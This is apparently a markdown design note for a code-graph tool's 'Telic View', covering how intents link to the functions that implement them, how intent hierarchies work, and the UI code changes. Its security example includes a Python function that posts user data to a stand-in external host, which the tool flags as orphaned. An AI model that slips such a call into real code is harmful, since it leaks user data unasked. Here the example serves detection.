# Telic View Improvements

## Problems Solved

### 1. **Intent Nodes Didn't Show Code** ❌ → ✅
**Before:** Clicking an intent only showed description text
**After:** Clicking an intent opens the first function that serves it, with code highlighted

### 2. **No Visibility Into Implementation** ❌ → ✅
**Before:** Inspector explained intent in words, but no connection to actual code
**After:** Inspector shows **all** functions implementing the intent with:
- Function names (clickable to jump to code)
- Edge labels explaining **how** each function serves the intent
- Example: "verify_token" → "Authenticate Users" via "verifies JWT tokens"

### 3. **No Intent Hierarchies** ❌ → ✅
**Before:** Flat list of intents, no relationships between them
**After:** Hierarchical intent graph showing:
- **Top-level goals**: "System Security", "User Privacy", "Financial Integrity"
- **Supporting intents**: "Authenticate Users", "Detect Fraud", "Encrypt Data"
- **Convergence**: How supporting intents feed into top-level goals
- **New edge type**: `supports_intent` (intent → intent)

---

## Visual Comparison

### CAUSAL View (Data Flow)
```
Files → Functions → Data
  ↓         ↓        ↓
user_id  JWT token  encrypted_data
```
- Edge labels show **WHAT** is flowing
- Blue edges: data flow
- Gray edges: function calls
- **Clear UX trace**: You can follow user journey through data

### TELIC View (Intent Convergence)
```
         Top-Level Goals
              ↑
    (supports_intent edges)
              ↑
      Supporting Intents
              ↑
    (serves_intent edges)
              ↑
         Functions/Data
```
- Purple edges (lighter): intent → intent (hierarchy)
- Purple edges (darker): function → intent (implementation)
- **Shows convergence**: How lower-level intents support higher goals
- **Code mapping**: Click any intent to see implementing functions

---

## Example: Telic Hierarchy

### Top-Level: "System Security"
**Supported by:**
- "Authenticate Users" (via "by verifying identity")
  - **Implemented by:** `verify_token()` - "verifies JWT tokens"
- "Detect Fraud" (via "by detecting threats")
  - **Implemented by:** `is_suspicious()` - "runs ML risk model"

### Top-Level: "User Privacy"
**Supported by:**
- "Encrypt Sensitive Data" (via "through encryption")
  - **Implemented by:** `encrypt_value()` - "encrypts with AES-256"

---

## User Flow

### Clicking an Intent Node:

**1. Graph highlights** the intent and all connected edges

**2. Code sidebar** opens the first implementing function with highlighted code

**3. Inspector panel** shows:
```
INTENT NODE
Authenticate Users

Description:
Verify user identity before access

Implemented By:
┌─────────────────────────────────┐
│ 📦 verify_token                 │
│ "verifies JWT tokens"           │
└─────────────────────────────────┘
```

**4. TELIC view** shows convergence:
```
verify_token()
    → "Authenticate Users"
        → "System Security"
```

---

## Technical Changes

### 1. Schema Updates

**Added edge type:**
```typescript
type: 'dependency' | 'flow' | 'serves_intent' | 'supports_intent'
```

**New intent nodes** in mock data:
- 3 top-level intents
- 3 supporting intents
- Intent-to-intent edges showing hierarchy

### 2. Click Handling

**`handleNodeClick` in App.tsx:**
```typescript
if (node.type === 'intent') {
  // Find all functions serving this intent
  const servingFunctions = edges
    .filter(e => e.target === node.id && e.type === 'serves_intent')
    .map(e => nodes.find(n => n.id === e.source));

  // Open first function's code
  showCodeForFunction(servingFunctions[0]);
}
```

### 3. Inspector Enhancement

**Sidebar.tsx now shows:**
```tsx
{selectedNode.type === 'intent' && (
  <div>
    <h3>Implemented By</h3>
    {servingFunctions.map(fn => (
      <div onClick={() => jumpToCode(fn)}>
        {fn.label}
        <em>"{edge.label}"</em>  {/* How it serves the intent */}
      </div>
    ))}
  </div>
)}
```

### 4. Prompt Updates

**Now asks AI for:**
- Intent hierarchies (top-level + supporting)
- `supports_intent` edges with labels
- Explains HOW each supporting intent contributes

### 5. Graph Visualization

**TELIC mode edge rendering:**
```typescript
if (edge.type === 'supports_intent') {
  strokeColor = '#c084fc';  // Lighter purple
  strokeWidth = 2;          // Thicker (more prominent)
  opacity = 1;              // Fully visible
}
```

---

## Comparison: Before vs After

| Feature | Before | After |
|---------|--------|-------|
| **Intent → Code** | ❌ No link | ✅ Click intent → see code |
| **Implementation visibility** | ❌ Description only | ✅ List of all functions |
| **Intent hierarchy** | ❌ Flat list | ✅ Convergence graph |
| **Edge labels** | ❌ Missing | ✅ Explains relationships |
| **Code highlighting** | ⚠️ Functions only | ✅ Functions + intents |
| **Inspector detail** | ⚠️ Basic | ✅ Full implementation list |

---

## Why This Matters

**Causal View:**
- Answers: "How does data flow?"
- Shows: User journey, data transformations
- Good for: Debugging, performance analysis

**Telic View (Now):**
- Answers: "Why does this code exist?"
- Shows: Purpose hierarchy, goal convergence
- Good for: Security audits, finding "slop code"
- **NEW:** Can trace from code → intent → higher goals
- **NEW:** See all code serving a purpose

---

## Example Security Use Case

**Suspicious orphaned function:**
```python
def send_telemetry(data):
    requests.post("external.com", data)
```

**Causal view:** Shows it receives user_id (suspicious!)
**Telic view:**
- No `serves_intent` edges → **ORPHANED**
- Not serving any system goal
- **Red flag:** Why does this exist?

**Inspector shows:**
```
⚠️ ORPHANED FUNCTIONS (No clear purpose mapped):
- send_telemetry: Sends data to external endpoint
```

---

## Next Steps (Future)

1. **Multi-select intents**: Highlight ALL code for multiple selected intents
2. **Intent search**: "Show me all code serving 'User Privacy'"
3. **Diff view**: Compare two implementations of same intent
4. **Intent coverage metrics**: What % of code serves clear purposes?
5. **Graph layouts**: Better positioning for large intent hierarchies
